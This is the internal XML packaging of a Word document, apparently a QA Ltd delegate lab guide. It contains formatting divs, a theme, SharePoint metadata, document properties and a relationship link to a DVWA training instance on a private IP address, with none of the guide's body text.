              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="488327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5131771">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1816025321">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="2049646277">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1656688087">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1295060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6705208">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="211968843">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1811243986">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="959805618">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="374"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="1496189677">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="210384962">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="2042364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63592823">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="956372267">
          <w:marLeft w:val="461"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="346"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="222522299">
          <w:marLeft w:val="461"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="346"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="315228802">
          <w:marLeft w:val="461"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="346"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="372073783">
          <w:marLeft w:val="461"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="346"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="766577921">
          <w:marLeft w:val="461"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="346"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="2020545522">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="242449383">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="304743852">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="522086484">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="374"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="347365100">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1903363646">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="1105996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hyperlink" Target="http://192.168.1.99/dvwa" TargetMode="External"/><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footer" Target="footer1.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endnotes" Target="endnotes.xml"/><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Rob\Documents\Courses\Development%20Work\Lab%20Guide%20Template.dotx" TargetMode="External"/></Relationships>
</file>

<file path=word/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
  <a:themeElements>
    <a:clrScheme name="QA">
      <a:dk1>
        <a:srgbClr val="2E2D2C"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="0E3C58"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="DADADA"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="00519C"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="CA1E17"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="18BF2B"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="7713B2"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="4591CE"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="F08300"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="134983"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="E50049"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="QA Segoe UI">
      <a:majorFont>
        <a:latin typeface="Segoe UI"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="Segoe UI"/>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C3333F4DDA8CFE4BBBB2885079309726" ma:contentTypeVersion="0" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="084b0a0d4a66b9762dda442d01886778">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="0967b7be50301903c78f9c39c6fd9af8">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D3E0241-2313-44D0-80CA-1ACAE25CB577}">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F03D79E3-FFDB-4AB9-8307-63203BA6ED9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3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{3F620DF7-3141-4915-AB81-4DEDDA9429E9}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps4.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{1BBFD5CD-2D37-4667-81D5-97E4634109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C:\Users\Rob\Documents\Courses\Development Work\Lab Guide Template.dotx</Template>
  <TotalTime>152</TotalTime>
  <Pages>21</Pages>
  <Words>2694</Words>
  <Characters>15360</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>128</Lines>
  <Paragraphs>36</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="2" baseType="variant">
      <vt:variant>
        <vt:lpstr>Title</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="1" baseType="lpstr">
      <vt:lpstr>DG_Delegate_Lab_Guide</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>QA Ltd</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>18018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DG_Delegate_Lab_Guide</dc:title>
  <dc:creator>Rob</dc:creator>
  <cp:lastModifiedBy>Limberger, Weronika (Associate DevOps Engineer)</cp:lastModifiedBy>
  <cp:revision>7</cp:revision>
  <cp:lastPrinted>2019-11-18T14:01:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-11-18T14:01:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-08-22T15:23:00Z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0x010100C3333F4DDA8CFE4BBBB2885079309726</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="CourseCode">
    <vt:lpwstr>MPDXXXX</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="BookType">
    <vt:lpwstr>5</vt:lpwstr>
  </property>
</Properties>
</file>